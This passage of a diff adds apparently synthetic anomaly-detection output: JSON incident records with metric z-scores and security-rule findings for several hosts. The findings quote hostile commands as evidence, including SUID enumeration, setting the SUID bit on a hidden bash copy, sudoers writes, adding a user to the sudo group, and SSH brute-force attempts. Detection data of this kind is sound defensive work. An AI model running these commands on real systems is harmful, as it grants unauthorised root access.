+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:39:58.114837+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:40:12.724527+00:00",
+        "rule_id":"PRIVESC-001",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"Unauthorised sudo attempt",
+        "evidence":"www-data : user NOT in sudoers ; TTY=unknown ; PWD=\/var\/www ; USER=root ; COMMAND=\/bin\/bash",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:40:13.129886+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=www-data cmd=\"find \/ -perm -4000 -type f\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:41:54.906709+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      }
+    ]
+  },
+  {
+    "key":"worker-01:memory_leak:20260115T0846",
+    "host":"worker-01",
+    "role":"worker",
+    "start":"2026-01-15T08:46:00+00:00",
+    "end":"2026-01-15T10:47:00+00:00",
+    "peak_score":6.8921,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"memory_leak",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"mem_pct",
+        "z":16.62
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":2.21
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":2.11
+      },
+      {
+        "metric":"cpu_pct",
+        "z":0.68
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-02:latency_degradation:20260115T1332",
+    "host":"web-02",
+    "role":"web",
+    "start":"2026-01-15T13:32:00+00:00",
+    "end":"2026-01-15T13:34:00+00:00",
+    "peak_score":1.1936,
+    "detectors":[
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"requests_per_sec",
+        "z":1.89
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":-1.29
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":1.18
+      },
+      {
+        "metric":"disk_pct",
+        "z":-0.94
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-01:suspicious_process:20260115T1439",
+    "host":"web-01",
+    "role":"web",
+    "start":"2026-01-15T14:39:00+00:00",
+    "end":"2026-01-15T15:08:00+00:00",
+    "peak_score":4.3462,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"suspicious_process",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"cpu_pct",
+        "z":10.82
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":9.94
+      },
+      {
+        "metric":"process_count",
+        "z":1.24
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":0.68
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-02:latency_degradation:20260115T1443",
+    "host":"web-02",
+    "role":"web",
+    "start":"2026-01-15T14:43:00+00:00",
+    "end":"2026-01-15T15:16:00+00:00",
+    "peak_score":4.3752,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"high",
+    "top_metrics":[
+      {
+        "metric":"latency_p95_ms",
+        "z":22.73
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":4.79
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":1.17
+      },
+      {
+        "metric":"requests_per_sec",
+        "z":-0.68
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-01:latency_degradation:20260115T1531",
+    "host":"web-01",
+    "role":"web",
+    "start":"2026-01-15T15:31:00+00:00",
+    "end":"2026-01-15T15:36:00+00:00",
+    "peak_score":1.6589,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"latency_p95_ms",
+        "z":4.26
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":2.59
+      },
+      {
+        "metric":"cpu_pct",
+        "z":2.05
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":1.15
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-02:latency_degradation:20260115T1531",
+    "host":"web-02",
+    "role":"web",
+    "start":"2026-01-15T15:31:00+00:00",
+    "end":"2026-01-15T15:36:00+00:00",
+    "peak_score":1.8117,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"latency_p95_ms",
+        "z":4.42
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":3.68
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.92
+      },
+      {
+        "metric":"mem_pct",
+        "z":1.0
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"api-01:latency_degradation:20260115T1532",
+    "host":"api-01",
+    "role":"api",
+    "start":"2026-01-15T15:32:00+00:00",
+    "end":"2026-01-15T15:35:00+00:00",
+    "peak_score":1.2592,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"latency_p95_ms",
+        "z":3.85
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":1.34
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":1.01
+      },
+      {
+        "metric":"cpu_pct",
+        "z":0.92
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-01:latency_degradation:20260115T1545",
+    "host":"web-01",
+    "role":"web",
+    "start":"2026-01-15T15:45:00+00:00",
+    "end":"2026-01-15T15:47:00+00:00",
+    "peak_score":1.038,
+    "detectors":[
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"requests_per_sec",
+        "z":2.22
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":-2.17
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":-1.87
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":1.69
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-02:traffic_surge:20260115T1609",
+    "host":"web-02",
+    "role":"web",
+    "start":"2026-01-15T16:09:00+00:00",
+    "end":"2026-01-15T16:43:00+00:00",
+    "peak_score":11.5304,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"traffic_surge",
+    "category":"operational",
+    "severity":"high",
+    "top_metrics":[
+      {
+        "metric":"requests_per_sec",
+        "z":40.09
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":34.76
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":28.5
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":9.13
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"api-02:latency_degradation:20260115T1625",
+    "host":"api-02",
+    "role":"api",
+    "start":"2026-01-15T16:25:00+00:00",
+    "end":"2026-01-15T16:52:00+00:00",
+    "peak_score":5.5399,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"high",
+    "top_metrics":[
+      {
+        "metric":"latency_p95_ms",
+        "z":34.97
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":3.93
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.51
+      },
+      {
+        "metric":"requests_per_sec",
+        "z":-1.0
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"api-02:cpu_spike:20260115T1841",
+    "host":"api-02",
+    "role":"api",
+    "start":"2026-01-15T18:41:00+00:00",
+    "end":"2026-01-15T19:11:00+00:00",
+    "peak_score":3.5608,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"cpu_spike",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"cpu_pct",
+        "z":8.82
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":5.84
+      },
+      {
+        "metric":"process_count",
+        "z":1.72
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":0.55
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"api-01:latency_degradation:20260115T1902",
+    "host":"api-01",
+    "role":"api",
+    "start":"2026-01-15T19:02:00+00:00",
+    "end":"2026-01-15T19:05:00+00:00",
+    "peak_score":1.1604,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"net_out_mbps",
+        "z":2.36
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":-2.27
+      },
+      {
+        "metric":"requests_per_sec",
+        "z":2.2
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.82
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"db-01:disk_fill:20260115T2153",
+    "host":"db-01",
+    "role":"db",
+    "start":"2026-01-15T21:53:00+00:00",
+    "end":"2026-01-16T00:03:00+00:00",
+    "peak_score":6.7891,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"disk_fill",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"disk_pct",
+        "z":24.98
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":3.37
+      },
+      {
+        "metric":"cpu_pct",
+        "z":0.41
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":0.25
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"worker-01:memory_leak:20260115T2338",
+    "host":"worker-01",
+    "role":"worker",
+    "start":"2026-01-15T23:38:00+00:00",
+    "end":"2026-01-16T01:59:00+00:00",
+    "peak_score":7.8824,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"memory_leak",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"mem_pct",
+        "z":23.52
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":2.99
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":2.97
+      },
+      {
+        "metric":"cpu_pct",
+        "z":0.78
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-01:cpu_spike:20260116T0053",
+    "host":"web-01",
+    "role":"web",
+    "start":"2026-01-16T00:53:00+00:00",
+    "end":"2026-01-16T01:32:00+00:00",
+    "peak_score":4.2849,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"cpu_spike",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"cpu_pct",
+        "z":16.03
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":6.34
+      },
+      {
+        "metric":"process_count",
+        "z":2.27
+      },
+      {
+        "metric":"mem_pct",
+        "z":-0.66
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"api-01:ssh_brute_force:20260116T0055",
+    "host":"api-01",
+    "role":"api",
+    "start":"2026-01-16T00:55:00+00:00",
+    "end":"2026-01-16T01:43:00+00:00",
+    "peak_score":7.0017,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"ssh_brute_force",
+    "category":"security",
+    "severity":"high",
+    "top_metrics":[
+      {
+        "metric":"failed_logins",
+        "z":46.88
+      },
+      {
+        "metric":"process_count",
+        "z":2.59
+      },
+      {
+        "metric":"cpu_pct",
+        "z":0.89
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":0.59
+      }
+    ],
+    "findings":[
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:05.690875+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"15 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for invalid user test from 198.51.100.229 port 32108 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:07.650332+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"16 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for root from 198.51.100.229 port 40207 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:07.972011+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"17 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for invalid user postgres from 198.51.100.229 port 59948 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:08.391990+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"18 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for invalid user oracle from 198.51.100.229 port 30018 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:08.418477+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"19 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for invalid user git from 198.51.100.229 port 55170 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:08.652531+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"20 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for root from 198.51.100.229 port 53567 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:08.883758+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"21 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for root from 198.51.100.229 port 34437 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:09.077415+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"22 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for invalid user postgres from 198.51.100.229 port 57408 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:10.263649+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"23 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for root from 198.51.100.229 port 34134 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:10.276411+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"24 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for invalid user test from 198.51.100.229 port 62825 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:11.607326+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"25 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for invalid user postgres from 198.51.100.229 port 36162 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:12.017050+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"26 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for invalid user oracle from 198.51.100.229 port 34505 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:12.296903+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"27 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for root from 198.51.100.229 port 40468 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:14.154246+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"28 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for invalid user root from 198.51.100.229 port 53922 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:15.341619+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"29 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for invalid user pi from 198.51.100.229 port 37552 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:15.548915+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"30 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for invalid user root from 198.51.100.229 port 35238 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:15.956909+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"31 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for root from 198.51.100.229 port 39317 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:15.970452+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"32 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for invalid user test from 198.51.100.229 port 36965 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:16.046906+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"33 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for invalid user git from 198.51.100.229 port 35605 ssh2",
+        "source_ip":"198.51.100.229"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T00:55:16.378832+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"34 failed SSH logins from 198.51.100.229 in 5 min",
+        "evidence":"Failed password for invalid user user from 198.51.100.229 port 36444 ssh2",
+        "source_ip":"198.51.100.229"
+      }
+    ]
+  },
+  {
+    "key":"api-02:privilege_escalation:20260116T0058",
+    "host":"api-02",
+    "role":"api",
+    "start":"2026-01-16T00:58:00+00:00",
+    "end":"2026-01-16T01:18:00+00:00",
+    "peak_score":1.4624,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"privilege_escalation",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"process_count",
+        "z":3.64
+      },
+      {
+        "metric":"failed_logins",
+        "z":2.4
+      },
+      {
+        "metric":"cpu_pct",
+        "z":0.94
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":0.55
+      }
+    ],
+    "findings":[
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T00:58:09.419382+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=www-data cmd=\"find \/ -perm -4000 -type f\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T00:58:17.037612+00:00",
+        "rule_id":"PRIVESC-001",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"Unauthorised sudo attempt",
+        "evidence":"www-data : user NOT in sudoers ; TTY=unknown ; PWD=\/var\/www ; USER=root ; COMMAND=\/bin\/bash",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T00:58:28.432771+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T00:59:40.409898+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T00:59:41.168516+00:00",
+        "rule_id":"PRIVESC-001",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"Unauthorised sudo attempt",
+        "evidence":"www-data : user NOT in sudoers ; TTY=unknown ; PWD=\/var\/www ; USER=root ; COMMAND=\/bin\/bash",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:00:58.900809+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:01:05.607539+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:01:09.506642+00:00",
+        "rule_id":"PRIVESC-001",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"Unauthorised sudo attempt",
+        "evidence":"www-data : user NOT in sudoers ; TTY=unknown ; PWD=\/var\/www ; USER=root ; COMMAND=\/bin\/bash",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:01:45.719617+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:01:47.206510+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:02:01.836279+00:00",
+        "rule_id":"PRIVESC-001",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"Unauthorised sudo attempt",
+        "evidence":"www-data : user NOT in sudoers ; TTY=unknown ; PWD=\/var\/www ; USER=root ; COMMAND=\/bin\/bash",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:02:45.429854+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:03:08.435706+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:03:54.140514+00:00",
+        "rule_id":"PRIVESC-001",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"Unauthorised sudo attempt",
+        "evidence":"www-data : user NOT in sudoers ; TTY=unknown ; PWD=\/var\/www ; USER=root ; COMMAND=\/bin\/bash",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:05:21.252372+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:06:22.637976+00:00",
+        "rule_id":"PRIVESC-001",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"Unauthorised sudo attempt",
+        "evidence":"www-data : user NOT in sudoers ; TTY=unknown ; PWD=\/var\/www ; USER=root ; COMMAND=\/bin\/bash",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:06:28.167576+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:06:38.422260+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:07:14.019805+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T01:07:15.900274+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      }
+    ]
+  },
+  {
+    "key":"db-01:data_exfiltration:20260116T0200",
+    "host":"db-01",
+    "role":"db",
+    "start":"2026-01-16T02:00:00+00:00",
+    "end":"2026-01-16T02:23:00+00:00",
+    "peak_score":3.6751,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"data_exfiltration",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"net_out_mbps",
+        "z":19.67
+      },
+      {
+        "metric":"cpu_pct",
+        "z":3.64
+      },
+      {
+        "metric":"mem_pct",
+        "z":-1.04
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":0.9
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"api-01:traffic_surge:20260116T0231",
+    "host":"api-01",
+    "role":"api",
+    "start":"2026-01-16T02:31:00+00:00",
+    "end":"2026-01-16T03:26:00+00:00",
+    "peak_score":8.7029,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"traffic_surge",
+    "category":"operational",
+    "severity":"high",
+    "top_metrics":[
+      {
+        "metric":"requests_per_sec",
+        "z":17.36
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":17.13
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":13.82
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":6.34
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"api-02:data_exfiltration:20260116T0455",
+    "host":"api-02",
+    "role":"api",
+    "start":"2026-01-16T04:55:00+00:00",
+    "end":"2026-01-16T05:26:00+00:00",
+    "peak_score":5.8231,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"data_exfiltration",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"net_out_mbps",
+        "z":42.72
+      },
+      {
+        "metric":"cpu_pct",
